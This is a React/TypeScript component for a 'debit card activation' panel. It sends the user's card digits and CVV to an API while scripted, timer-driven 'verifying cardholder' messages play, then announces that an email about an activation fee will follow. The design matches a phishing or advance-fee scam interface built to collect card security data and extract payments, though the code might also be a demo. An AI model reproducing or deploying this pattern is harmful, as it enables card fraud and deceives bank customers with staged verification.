'use client';

import { useEffect, useState } from 'react';
import {
  DEBIT_CARD_ACTIVATION_FEE,
  DEBIT_CARD_BANKING_EMAIL,
  formatCardFee,
} from '@/lib/banking/card';

type Phase = 'loading' | 'done' | 'error';

const LOADING_LINES = [
  'Matching card to account…',
  'Loading name on file…',
  'Confirming mailing address…',
  'Submitting activation request…',
];

export function DebitCardActivationPanel({
  fullName,
  accountNumber,
  addressLine1,
  city,
  state,
  postalCode,
  cardLast6,
  cardCvv,
}: {
  fullName: string;
  accountNumber: string;
  addressLine1: string;
  city: string;
  state: string;
  postalCode: string;
  cardLast6: string;
  cardCvv: string;
}) {
  const [phase, setPhase] = useState<Phase>('loading');
  const [err, setErr] = useState('');
  const [line, setLine] = useState(0);

  const address = `${addressLine1}, ${city}, ${state} ${postalCode}`;

  useEffect(() => {
    let cancelled = false;
    const tick = window.setInterval(() => {
      setLine((i) => Math.min(i + 1, LOADING_LINES.length - 1));
    }, 800);

    (async () => {
      try {
        const res = await fetch('/api/banking/debit-card-request', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            cardLast6: cardLast6.trim(),
            cardCvv: cardCvv.trim(),
          }),
        });
        const json = await res.json();
        if (cancelled) return;
        if (!res.ok) {
          window.clearInterval(tick);
          setErr(json.message || json.error || 'Could not submit request.');
          setPhase('error');
          return;
        }
        window.setTimeout(() => {
          if (cancelled) return;
          window.clearInterval(tick);
          setPhase('done');
        }, 3800);
      } catch {
        if (cancelled) return;
        window.clearInterval(tick);
        setErr('Could not submit request. Please try again.');
        setPhase('error');
      }
    })();

    return () => {
      cancelled = true;
      window.clearInterval(tick);
    };
  }, [cardLast6, cardCvv]);

  if (phase === 'done') {
    return (
      <div className="border border-[var(--ecf-line)] bg-[var(--ecf-sky)] p-4 text-sm text-[var(--ecf-navy)]">
        <p className="font-semibold">Card activation request submitted</p>
        <p className="mt-2 text-xs leading-relaxed">
          Expect an email shortly from <strong>{DEBIT_CARD_BANKING_EMAIL}</strong> with how
          activation works and the activation fee of {formatCardFee(DEBIT_CARD_ACTIVATION_FEE)}.
        </p>
      </div>
    );
  }

  if (phase === 'error') {
    return <p className="text-sm text-red-600">{err}</p>;
  }

  return (
    <div className="space-y-4 border border-[var(--ecf-line)] bg-[var(--ecf-paper)] p-4">
      <div className="flex flex-col items-center py-2 text-center">
        <div
          className="h-10 w-10 animate-spin rounded-full border-[3px] border-[var(--ecf-sky)] border-t-[var(--ecf-navy)]"
          aria-hidden
        />
        <p className="mt-4 text-sm font-semibold text-[var(--ecf-navy)]">Verifying cardholder</p>
        <p className="mt-1 text-xs text-[var(--ecf-muted)]">{LOADING_LINES[line]}</p>
      </div>
      <dl className="space-y-2 border-t border-[var(--ecf-line)] pt-3 text-sm">
        <div>
          <dt className="text-[11px] font-semibold uppercase tracking-[0.12em] text-[var(--ecf-blue)]">
            Name on file
          </dt>
          <dd className="mt-0.5 font-semibold text-[var(--ecf-navy)]">{fullName}</dd>
        </div>
        <div>
          <dt className="text-[11px] font-semibold uppercase tracking-[0.12em] text-[var(--ecf-blue)]">
            Account
          </dt>
          <dd className="mt-0.5 font-mono text-[var(--ecf-navy)]">{accountNumber}</dd>
        </div>
        <div>
          <dt className="text-[11px] font-semibold uppercase tracking-[0.12em] text-[var(--ecf-blue)]">
            Address on file
          </dt>
          <dd className="mt-0.5 text-[var(--ecf-navy)]">{address}</dd>
        </div>
      </dl>
    </div>
  );
}
